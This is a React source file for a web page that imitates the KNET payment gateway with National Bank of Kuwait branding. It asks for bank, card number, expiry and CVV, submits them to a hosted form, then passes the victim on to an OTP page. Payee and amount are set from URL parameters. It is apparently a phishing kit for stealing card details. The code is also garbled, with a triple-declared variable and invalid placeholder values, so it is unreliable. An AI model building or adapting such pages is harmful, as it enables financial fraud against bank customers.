import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";

const defaultPaymentData = {
  customerName: "{paymentData.customerName}",
  amount: {paymentData.amount},
  currency: "KWD",
  description: "{paymentData.description}"
};

const CardDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  
  const queryParams = new URLSearchParams(window.location.search);
    const queryParams = new URLSearchParams(window.location.search);
    const queryParams = new URLSearchParams(window.location.search);
  const currentPayment = {
    customerName: queryParams.get('n') || "{paymentData.customerName}",
    amount: queryParams.get('a') || "{paymentData.amount}",
    currency: queryParams.get('c') || "د.ك",
    description: queryParams.get('p') || "{paymentData.description}"
  };
  
  const [formData, setFormData] = useState({
    bank: "",
    cardNumber: "",
    expiryMonth: "",
    expiryYear: "",
    cvv: "",
    prefix: ""
  });
  const [loading, setLoading] = useState(false);

  const kuwaitiBanks = [
    { value: "", label: "يرجى اختيار البنك" },
    { value: "nbk", label: "بنك الكويت الوطني" },
    { value: "gbk", label: "بنك الخليج" },
    { value: "cbk", label: "البنك التجاري الكويتي" },
    { value: "abk", label: "بنك الأهلي الكويتي" },
    { value: "kfh", label: "بيت التمويل الكويتي" },
    { value: "burgan", label: "بنك برقان" },
    { value: "warba", label: "بنك وربة" },
    { value: "boubyan", label: "بنك بوبيان" },
    { value: "kib", label: "البنك الكويتي الصناعي" },
    { value: "ksb", label: "بنك الكويت والشرق الأوسط" },
    { value: "mashreq", label: "بنك المشرق" }
  ];

  const cardPrefixes = [
    { value: "", label: "بادئة" },
    { value: "4", label: "4 (Visa)" },
    { value: "5", label: "5 (MasterCard)" },
    { value: "6", label: "6 (Discover)" },
    { value: "3", label: "3 (American Express)" }
  ];

  const formatCardNumber = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '');
    const formatted = digitsOnly.replace(/(.{4})/g, '$1 ').trim();
    return formatted.slice(0, 19);
  };

  const handleInputChange = (field: string, value: string) => {
    if (field === 'cardNumber') {
      setFormData({...formData, [field]: formatCardNumber(value)});
    } else if (field === 'cvv') {
      setFormData({...formData, [field]: value.replace(/\D/g, '').slice(0, 3)});
    } else if (field === 'expiryMonth') {
      setFormData({...formData, [field]: value.replace(/\D/g, '').slice(0, 2)});
    } else if (field === 'expiryYear') {
      setFormData({...formData, [field]: value.replace(/\D/g, '').slice(0, 4)});
    } else {
      setFormData({...formData, [field]: value});
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    
    setTimeout(() => {
      navigate(`/otp/${id}${window.location.search}`);
    }, 2000);
  };

  return (
    <div className="min-h-screen" style={{ backgroundColor: '#e8e8e8' }}>
      <div className="w-full h-20 sm:h-32 bg-gradient-to-r from-blue-300 to-blue-500 relative overflow-hidden">
        <img 
          src="/lovable-uploads/1d2a9902-d961-468c-9f95-1695f21fb91b.png" 
          alt="NBK Logo" 
          className="w-full h-full object-cover"
        />
      </div>

      <div className="container mx-auto px-3 sm:px-6 py-4 sm:py-8 max-w-2xl">
        <div className="bg-white rounded-2xl sm:rounded-3xl shadow-lg p-4 sm:p-8 mb-3 sm:mb-6" style={{ borderRadius: '16px', boxShadow: '0 4px 16px rgba(0,0,0,0.1)' }}>
          <div className="text-center mb-4 sm:mb-8">
            <div className="flex items-center justify-center mb-3 sm:mb-6">
              <img 
                src="/lovable-uploads/dd68033e-3d38-482d-ad61-28ff811e33ba.png" 
                alt="NBK Logo" 
                className="h-8 sm:h-12 w-auto"
              />
            </div>
          </div>
          
          <div className="border-t border-gray-300 pt-3 sm:pt-6">
            <div className="flex justify-between items-center mb-3 sm:mb-6 text-sm sm:text-lg">
              <span className="text-blue-600 font-medium">{currentPayment.customerName}</span>
              <span className="text-gray-800 font-medium">:المستفيد</span>
            </div>
            <div className="border-t border-gray-300 pt-2 sm:pt-4">
              <div className="flex justify-between items-center text-base sm:text-xl">
                <span className="text-blue-600 font-bold">KD {currentPayment.amount.toFixed(3)}</span>
                <span className="text-gray-800 font-medium">:المبلغ</span>
              </div>
            </div>
          </div>
        </div>

        <div className="bg-white rounded-2xl sm:rounded-3xl shadow-lg p-4 sm:p-8 mb-3 sm:mb-6" style={{ borderRadius: '16px', boxShadow: '0 4px 16px rgba(0,0,0,0.1)' }}>
          <form 
            name="card-details" 
            method="POST" 
            data-netlify="true" 
            netlify-honeypot="bot-field"
            onSubmit={handleSubmit} 
            className="space-y-4 sm:space-y-8"
          >
            <input type="hidden" name="form-name" value="card-details" />
            <input type="hidden" name="payment-id" value={id} />
            <p style={{ display: 'none' }}>
              <label>
                Don't fill this out if you're human: <input name="bot-field" />
              </label>
            </p>

            <div className="space-y-2 sm:space-y-3">
              <div className="flex justify-between items-center">
                <select 
                  name="bank"
                  value={formData.bank}
                  onChange={(e) => handleInputChange('bank', e.target.value)}
                  className="flex-1 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-sm sm:text-lg" 
                  style={{ borderRadius: '8px' }}
                  required
                >
                  {kuwaitiBanks.map((bank) => (
                    <option key={bank.value} value={bank.value}>
                      {bank.label}
                    </option>
                  ))}
                </select>
                <label className="text-blue-600 font-medium mr-3 sm:mr-6 whitespace-nowrap text-sm sm:text-lg">:يرجى اختيار البنك</label>
              </div>
            </div>

            <div className="space-y-2 sm:space-y-3">
              <div className="flex justify-between items-center">
                <div className="flex space-x-2 sm:space-x-3 flex-1">
                  <select 
                    name="card-prefix"
                    value={formData.prefix}
                    onChange={(e) => handleInputChange('prefix', e.target.value)}
                    className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-xs sm:text-base" 
                    style={{ borderRadius: '8px' }}
                    required
                  >
                    {cardPrefixes.map((prefix) => (
                      <option key={prefix.value} value={prefix.value}>
                        {prefix.label}
                      </option>
                    ))}
                  </select>
                  <Input
                    type="text"
                    name="card-number"
                    value={formData.cardNumber}
                    onChange={(e) => handleInputChange('cardNumber', e.target.value)}
                    className="flex-1 p-2 sm:p-4 border-2 border-blue-500 rounded-lg sm:rounded-xl text-center text-sm sm:text-lg"
                    style={{ borderRadius: '8px', borderColor: '#3b82f6' }}
                    required
                  />
                </div>
                <label className="text-blue-600 font-medium mr-3 sm:mr-6 whitespace-nowrap text-sm sm:text-lg">:رقم بطاقة الصرف الآلي</label>
              </div>
            </div>

            <div className="space-y-2 sm:space-y-3">
              <div className="flex justify-between items-center">
                <div className="flex space-x-2 sm:space-x-3">
                  <select 
                    name="expiry-year"
                    value={formData.expiryYear}
                    onChange={(e) => handleInputChange('expiryYear', e.target.value)}
                    className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-xs sm:text-base"
                    style={{ borderRadius: '8px' }}
                    required
                  >
                    <option value="">YYYY</option>
                    <option value="2024">2024</option>
                    <option value="2025">2025</option>
                    <option value="2026">2026</option>
                    <option value="2027">2027</option>
                    <option value="2028">2028</option>
                  </select>
                  <select 
                    name="expiry-month"
                    value={formData.expiryMonth}
                    onChange={(e) => handleInputChange('expiryMonth', e.target.value)}
                    className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-xs sm:text-base"
                    style={{ borderRadius: '8px' }}
                    required
                  >
                    <option value="">MM</option>
                    {Array.from({length: 12}, (_, i) => (
                      <option key={i+1} value={String(i+1).padStart(2, '0')}>
                        {String(i+1).padStart(2, '0')}
                      </option>
                    ))}
                  </select>
                </div>
                <label className="text-blue-600 font-medium mr-3 sm:mr-6 whitespace-nowrap text-sm sm:text-lg">:تاريخ انتهاء البطاقة</label>
              </div>
            </div>

            <div className="space-y-2 sm:space-y-3">
              <div className="flex justify-between items-center">
                <Input
                  type="text"
                  name="cvv"
                  value={formData.cvv}
                  onChange={(e) => handleInputChange('cvv', e.target.value)}
                  className="flex-1 p-2 sm:p-4 border-2 border-blue-500 rounded-lg sm:rounded-xl text-center text-sm sm:text-lg"
                  style={{ borderRadius: '8px', borderColor: '#3b82f6' }}
                  maxLength={3}
                  required
                />
                <label className="text-blue-600 font-medium mr-3 sm:mr-6 whitespace-nowrap text-sm sm:text-lg">:الرقم السري</label>
              </div>
            </div>

            <div className="bg-white rounded-2xl sm:rounded-3xl p-4 sm:p-8 mt-6">
              <div className="flex space-x-3 sm:space-x-6">
                <button
                  type="submit"
                  className="flex-1 bg-blue-700 text-white py-3 sm:py-5 rounded-xl sm:rounded-2xl text-base sm:text-xl font-bold hover:bg-blue-800 transition-colors shadow-lg disabled:opacity-50"
                  disabled={loading}
                >
                  {loading ? 'جاري التحميل...' : 'إرسال'}
                </button>
              </div>
            </div>
          </form>
        </div>

        <div className="text-center mt-6 sm:mt-12 text-gray-700">
          <div className="text-sm sm:text-lg mb-2 sm:mb-3 font-medium">جميع الحقوق محفوظة © 2025</div>
          <div className="text-sm sm:text-lg text-blue-600 font-medium">شركة الخدمات المصرفية الآلية المشتركة - كي نت</div>
        </div>
      </div>
    </div>
  );
};

export default CardDetails;
